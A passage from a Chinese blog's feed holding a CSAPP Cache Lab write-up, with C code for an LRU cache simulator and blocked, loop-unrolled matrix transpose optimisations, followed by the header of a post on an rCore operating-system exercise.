punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 访问指定地址对应的cache组号和tag</span><span class="token keyword">void</span> <span class="token function">access_cache</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> address<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">,</span> index<span class="token punctuation">;</span>    <span class="token function">get_cache_parts</span><span class="token punctuation">(</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tag<span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> isHit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 是否命中</span>    CacheSet <span class="token operator">*</span>set <span class="token operator">=</span> <span class="token operator">&amp;</span>cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">==</span> tag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            isHit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">" hit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">++</span>cache<span class="token operator">-></span>hit_count<span class="token punctuation">;</span>            set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isHit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 未命中</span>        <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">" miss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>cache<span class="token operator">-></span>miss_count<span class="token punctuation">;</span>        <span class="token keyword">int</span> lru_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// LRU策略选择写入行</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">&lt;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                lru_index <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">" eviction"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">++</span>cache<span class="token operator">-></span>evict_count<span class="token punctuation">;</span>  <span class="token comment">// 行置换</span>        <span class="token punctuation">&#125;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">++</span>cache<span class="token operator">-></span>access_count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: ./csim-ref [-hv] -s &lt;num> -E &lt;num> -b &lt;num> -t &lt;file>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Options:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -h         Print this help message.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -v         Optional verbose flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -s &lt;num>   Number of set index bits.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -E &lt;num>   Number of lines per set.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -b &lt;num>   Number of block offset bits.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -t &lt;file>  Trace file.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Examples:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  linux>  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  linux>  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vflag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>trace_file <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment">// 参数定义</span>    <span class="token keyword">struct</span> <span class="token class-name">option</span> long_options<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span> <span class="token string">"help"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"verbose"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'v'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"set"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'s'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"lines"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'E'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"block"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"trace"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'t'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 参数解析</span>    <span class="token keyword">int</span> opt<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"hvs:E:b:t:"</span><span class="token punctuation">,</span> long_options<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token operator">:</span>                <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token operator">:</span>                vflag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>                s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token operator">:</span>                E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token operator">:</span>                b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token operator">:</span>                trace_file <span class="token operator">=</span> optarg<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    Cache cache<span class="token punctuation">;</span>    <span class="token function">init_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> s<span class="token punctuation">,</span> E<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>trace_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Faild to open file %s\n"</span><span class="token punctuation">,</span> trace_file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        line<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>  <span class="token comment">// 去除尾置换行符</span>        <span class="token keyword">char</span> <span class="token operator">*</span>pline <span class="token operator">=</span> line <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// 去除前导空格</span>                <span class="token keyword">char</span> operation<span class="token punctuation">;</span>        <span class="token keyword">int</span> address<span class="token punctuation">,</span> size<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>pline<span class="token punctuation">,</span> <span class="token string">" %c %x,%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Invalid line format: %s\n"</span><span class="token punctuation">,</span> pline<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token function">trace_info</span><span class="token punctuation">(</span>pline<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>operation <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printSummary</span><span class="token punctuation">(</span>cache<span class="token punctuation">.</span>hit_count<span class="token punctuation">,</span> cache<span class="token punctuation">.</span>miss_count<span class="token punctuation">,</span> cache<span class="token punctuation">.</span>evict_count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h1><h2 id="分块优化"><a href="#分块优化" class="headerlink" title="分块优化"></a>分块优化</h2><p>根据实验手册的说明，分块是降低 Cache misses 的有效方法，可以参考<a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">矩阵乘分块优化方法</a>。</p><p>对于朴素二重循环的矩阵转置方法，矩阵 $A$ 的空间局部性较好，但是矩阵 $B$ 的时间局部性和空间局部性都比较差，访问效率很低。而采用分块方法时，矩阵 $A$ 的空间局部性没有太大下降，但是 $B$ 的时间局部性和空间局部性却有了很大的提升。</p><p>因此我先尝试了分块优化方法，问题在于，块大小应该如何选取？为了偷懒（🤭），我利用 C 语言宏编写了一个分块矩阵转置的函数模板，并测试三个测试样例在不同块大小下的 Cache misses 次数。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token expression"><span class="token punctuation">(</span>R<span class="token punctuation">,</span> C<span class="token punctuation">)</span>                                       </span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">char</span> blocked</span><span class="token punctuation">##</span><span class="token expression">R</span><span class="token punctuation">##</span><span class="token expression">_</span><span class="token punctuation">##</span><span class="token expression">C</span><span class="token punctuation">##</span><span class="token expression">_trans_desc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> </span><span class="token string">"("</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">R </span></span></span><span class="token string">", "</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">C </span></span></span><span class="token string">") Blocked row-wise scan transpose"</span><span class="token expression"><span class="token punctuation">;</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">void</span> blocked</span><span class="token punctuation">##</span><span class="token expression">R</span><span class="token punctuation">##</span><span class="token expression">_</span><span class="token punctuation">##</span><span class="token expression">C</span><span class="token punctuation">##</span><span class="token expression"><span class="token function">_trans</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span>       </span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">&#123;</span>                                                                           </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> ii<span class="token punctuation">,</span> jj<span class="token punctuation">,</span> tmp<span class="token punctuation">;</span>                                                  </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> brsize <span class="token operator">=</span> R<span class="token punctuation">,</span> bcsize <span class="token operator">=</span> C<span class="token punctuation">;</span>                                             </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> enr <span class="token operator">=</span> brsize <span class="token operator">*</span> <span class="token punctuation">(</span>N <span class="token operator">/</span> brsize<span class="token punctuation">)</span><span class="token punctuation">;</span>                                        </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> enc <span class="token operator">=</span> bcsize <span class="token operator">*</span> <span class="token punctuation">(</span>M <span class="token operator">/</span> bcsize<span class="token punctuation">)</span><span class="token punctuation">;</span>                                        </span><span class="token punctuation">\</span>                                                                            <span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;=</span> enr<span class="token punctuation">;</span> ii <span class="token operator">+=</span> brsize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                 </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>jj <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> jj <span class="token operator">&lt;=</span> enc<span class="token punctuation">;</span> jj <span class="token operator">+=</span> bcsize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                             </span><span class="token punctuation">\</span>            <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> ii<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span>N <span class="token operator">&lt;</span> ii <span class="token operator">+</span> brsize <span class="token operator">?</span> N <span class="token operator">:</span> ii <span class="token operator">+</span> brsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    </span><span class="token punctuation">\</span>                <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> jj<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span>M <span class="token operator">&lt;</span> jj <span class="token operator">+</span> bcsize <span class="token operator">?</span> M <span class="token operator">:</span> jj <span class="token operator">+</span> bcsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></span><span class="token punctuation">\</span>                    <span class="token expression">tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                                          </span><span class="token punctuation">\</span>                    <span class="token expression">B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>                                          </span><span class="token punctuation">\</span>                <span class="token expression"><span class="token punctuation">&#125;</span>                                                           </span><span class="token punctuation">\</span>            <span class="token expression"><span class="token punctuation">&#125;</span>                                                               </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token punctuation">&#125;</span>                                                                   </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">&#125;</span>                                                                       </span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">&#125;</span></span></span></code></pre><p>在使用时，只需要将模板“实例化”即可：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></code></pre><p>然后将这些函数注册到 <code>registerFunctions</code> 中，使用 <code>test-trans</code> 即可对所有注册的矩阵转置函数进行测试。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">registerFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* Register your solution function */</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>transpose_submit<span class="token punctuation">,</span> transpose_submit_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* Register any additional transpose functions */</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>trans<span class="token punctuation">,</span> trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Blocked</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>blocked4_4_trans<span class="token punctuation">,</span> blocked4_4_trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>blocked5_5_trans<span class="token punctuation">,</span> blocked5_5_trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">registerTransFunction</span><span class="token punctuation">(</span>blocked20_20_trans<span class="token punctuation">,</span> blocked20_20_trans_desc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>经过暴力枚举，发现在 $32×32$、$64×64$、$61×67$ 下的最优矩阵分块大小分别为 8、4、17，在 <code>transpose-submit</code> 函数中根据 M、N 的值分别调用适合的转置函数，得分如下：</p><p><img src="/2024/12/17/CSAPP-Cache-Lab/optim1.png" alt></p><h2 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h2><p>在上面的分块转置模板中，矩阵 $A$ 和 $B$ 是交替进行访问的，这可能导致矩阵 $A$ 访问的块马上又在访问矩阵 $B$ 时被置换，因此可以将最内层循环进行展开，对于分块大小为 $bsize$ 的转置方法，先连续访问完 $A$ 的一个 $1×bsize$ 的切片，将其暂存入变量中，再连续访问 $B$ 的 $bsize×1$ 切片。</p><p>将 $32×32$ 和 $64×64$ （$61×67$ 的测试样例已得满分，没有选择进一步优化）的对应的分块转置方法的内层循环展开后，得分如下：</p><p><img src="/2024/12/17/CSAPP-Cache-Lab/optim2.png" alt></p><p>这样，$32×32$ 也得到了满分，但是 $64×64$ 分数仍然比较低，看来简单的分块方法还不够，可能需要针对 Cache 的参数将矩阵元素访问顺序进行重排，这部分我暂时没有完成，之后有时间可以再尝试一下。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本 Lab 主要考察对计算机高速缓存（Cache）机制的理解，以及如何针对 Cache 进行程序的优化，对应知识点为书中的 6.4 ~ 6.6 节内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="矩阵" scheme="http://lordaeronesz.github.io/tags/%E7%9F%A9%E9%98%B5/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter8练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-04T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:44.447Z</updated>
    
